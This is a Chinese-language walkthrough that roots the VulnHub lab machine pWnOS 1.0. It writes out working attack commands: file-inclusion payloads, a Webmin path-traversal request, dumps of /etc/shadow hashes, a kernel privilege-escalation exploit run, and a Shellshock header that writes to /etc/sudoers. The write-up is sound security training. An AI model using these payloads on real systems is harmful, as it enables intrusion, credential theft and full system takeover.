# pWnOS: 1.0

2024-4-24 https://www.vulnhub.com/entry/pwnos-10,33/

difficulty: intermediate

## IP

192.168.10.175

## Scan

Open Port -> 22,80,139,445,10000

```
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
| ssh-hostkey:
|   1024 e44640bfe629acc600e2b2a3e150903c (DSA)
|_  2048 10cc35458ef27aa1ccdba0e8bfc7733d (RSA)
80/tcp    open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
|_http-title: Site doesn't have a title (text/html).
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
445/tcp   open  netbios-ssn Samba smbd 3.0.26a (workgroup: MSHOME)
10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
```

先看看 smb 上有什么暴露出来信息：

```
enum4linux -a 192.168.10.175

Sharename       Type      Comment
---------       ----      -------
home            Disk      Home Directory for vmware User
print$          Disk      Printer Drivers
IPC$            IPC       IPC Service (ubuntuvm)
```

连接 SMB 出现错误提示，不能进一步查看：

```
smbclient -N //192.168.10.175/home

Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
```

暂时放弃 SMB 这个方向，转向其他 2 个 web 服务。

对于 http://192.168.10.175/ 页面上，是一个可以提供帮助的页面，进行目录扫描，发现 2 个目录 /index1 和 /index2，访问 http://192.168.10.175/index1.php 时出现了有趣的提示：

```
Warning: include() [function.include]: Failed opening '' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/index1.php on line 18
```

看样子是 URL 中的某个参数没有设置，导致 include 时出现了问题。

访问 http://192.168.10.175/index1.php?help=true&connect=true 时，页面是正常的，说明 include 需要的参数不是 help 就是 connect。当 connect 为空时，就出现了 include 错误的提示。

让我们直接访问 http://192.168.10.175/index1.php?help=true&connect=/etc/passwd ，就直接能看到了 /etc/passwd 中的内容，发现几个有用账户名：

```
root:x:0:0:root:/root:/bin/bash
vmware:x:1000:1000:vmware,,,:/home/vmware:/bin/bash
obama:x:1001:1001::/home/obama:/bin/bash
osama:x:1002:1002::/home/osama:/bin/bash
yomama:x:1003:1003::/home/yomama:/bin/bash
```

在尝试用 php 包装器，读下 index1.php 和 index2.php 的代码，看看有什么内容：

http://192.168.10.175/index1.php?help=true&connect=php://filter/read=convert.base64-encode/resource=index1.php

```
<?php
//if($_GET['help'] == 'true'){
    include('ssiaddon.php');
//}

if($_GET['connect'] != 'true'){
    include($_GET['connect']);
}
?>
```

index1.php 中有一个注释的页面：ssiaddon.php，或许还存在，读取后没发现什么有用信息；index2.php 中也没什么有用信息。

尝试能否能远程 http 文件包含 kali 上的 php web 后门代码，发现不行，应该是 php 中相关 allow_url 参数没有打开。尝试能否找到目标机器上的日志目录，然后包含日志，在日志中植入 php 后门代码。web server 是 Apache，先查看下配置文件，看看日志文件的配置目录：/etc/apache2/apache2.conf ，发现其中配置的日志级别为：LogLevel warn，导致普通日志文件没有记录。

在这个 80 的 web 服务上没有发现其他的有价值信息了，尝试其他路径。

看看另外一个 Webmin 10000 端口的服务，由于我们没有账号和密码，所以不能登录。Webmin 存在多个漏洞，让我们尝试看是否能利用，使用 msf 中的 admin/webmin/file_disclosure 对重要文件进行读取，先尝试读取 /etc/shadow ：

```
RPATH    /etc/shadow       yes       The file to download

root:$1$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm/:14041:0:99999:7:::
vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::
obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::
osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::
yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::
```

使用 john 进行爆破，尝试得到明文密码：h4ckm3 (vmware)，进而使用 ssh 登陆：

```
ssh -oHostKeyAlgorithms=ssh-dss,ssh-rsa vmware@192.168.10.175
```

登陆后，继续进行系统枚举，在 /home/obama 中有一个.ssh 文件夹，不知道其中有没有 ssh 密钥，让我们使用上面 msf 中的 exploit 继续去尝试读取：

```
set rpath /home/obama/.ssh/id_rsa
```

通过 ps 查看，发现 webmin 是通过 root 用户启动的，是否能找到 webmin 的配置文件，获取到用户名和密码进行登陆，通过查找得知了 webmin 的用户配置文件的信息存储在：/etc/webmin/miniserv.users，继续用上面的 msf 中的 exp 去进行读取：

```
set rpath /etc/webmin/miniserv.users
run

admin:$1$XXXXXXXX$8y5sgW4DoOQjHB7V9K4/G.:0
```

但是 rockyou 中没有匹配的密码，爆破失败。

## cgi 执行提权

在尝试寻找 webmin 的 RCE 执行漏洞，前面的漏洞利用，发现了 webmin 可以包含文件，由于 webmin 是由 perl 语言编写的，所以只要我们把 perl 反弹代码存储到文件中，然后去利用文件包含漏洞去包含这个文件，代码就会被执行，将 perl 的反弹代码放到目标机器的 /home/vmware/rev8888.cgi 文件中，然后访问下面的文件包含链接：

```
curl 'http://192.168.10.175:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/home/vmware/rev8888.cgi'
```

在我们的 kali 上进行监听，最终得到了反弹的 root shell：

```
# id
uid=0(root) gid=0(root)
# cd /root
# ls -al
total 28
drwxr-xr-x  4 root root 4096 Jun 12  2008 .
drwxr-xr-x 21 root root 4096 Jun 10  2008 ..
-rw-r--r--  1 root root  775 Jun 20  2008 .bash_history
-rw-r--r--  1 root root 2227 May 15  2007 .bashrc
-rw-------  1 root root    0 Jun 11  2008 .mysql_history
-rw-r--r--  1 root root  141 May 15  2007 .profile
drwx------  2 root root 4096 Jun 11  2008 .ssh
drwxr-xr-x  2 root root 4096 Jun 12  2008 keys
```

## 内核提权

同时也可以使用内核漏洞进行提权，目标机器的内核版本为：2.6.22，通过搜索，可以使用如下的代码：

```
Linux Kernel 2.6.17 < 2.6.24.1 - 'vmsplice' Local Privilege Escalation (2) | linux/local/5092.
```

下载到目标机器，编译执行：

```
vmware@ubuntuvm:~$ gcc 5092.c -o 5092
vmware@ubuntuvm:~$ ./5092
----------------------------------
 Linux vmsplice Local Root Exploit
 By qaaz
-----------------------------------
[+] mmap: 0x0 .. 0x1000
[+] page: 0x0
[+] page: 0x20
[+] mmap: 0x4000 .. 0x5000
[+] page: 0x4000
[+] page: 0x4020
[+] mmap: 0x1000 .. 0x2000
[+] page: 0x1000
[+] mmap: 0xb7e54000 .. 0xb7e86000
[+] root
root@ubuntuvm:~# id
uid=0(root) gid=0(root) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),111(lpadmin),112(admin),1000(vmware)
```

最后看下，为什么文件包含那里不能直接包含.pl 的脚本，查看 webmin 的配置文件 /etc/webmin/miniserv.conf ，看到其中有一行 denyfile=\.pl$ ，估计是这里导致包含.pl 文件时，出现了：Error - Access denied to，那能否包含其他后缀的文件，如.txt ，进行尝试，发现.txt 的文件直接是显示的文件内容，没有对 pl 代码进行解析。所以只能把 shell 文件的后缀名改为.cgi。

目标靶机的 base 版本较低，小于 `4.3` 的可能存在 ShellShock 漏洞，让我们进行测试看是否存在：

```
vmware@ubuntuvm:~$ env x='() { :; }; echo "VULNERABLE TO SHELLSHOCK"' bash -c date
VULNERABLE TO SHELLSHOCK
Thu Apr 25 01:19:23 CDT 2024
```

表明存在 ShellShock 漏洞。使用 nikto 对 10000 端口进行探测，发现有 cgi 执行，那么我们就可以利用 ShellShock 执行我们的特殊代码：

```
vmware@ubuntuvm:~$ echo '#!/bin/bash' > test.cgi
vmware@ubuntuvm:~$ chmod +x test.cgi

curl 'http://192.168.10.175:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/home/vmware/test.cgi' -H 'User-Agent: () { :; }; /bin/echo "vmware ALL=(ALL)NOPASSWD:ALL" >> /etc/sudoers'
```

这时 vmware 就有了以 root 身份对所有命令的免密执行权限：

```
vmware@ubuntuvm:~$ sudo -l
User vmware may run the following commands on this host:
    (ALL) NOPASSWD: ALL
vmware@ubuntuvm:~$ sudo /bin/bash
root@ubuntuvm:~# id
uid=0(root) gid=0(root) groups=0(root)
```
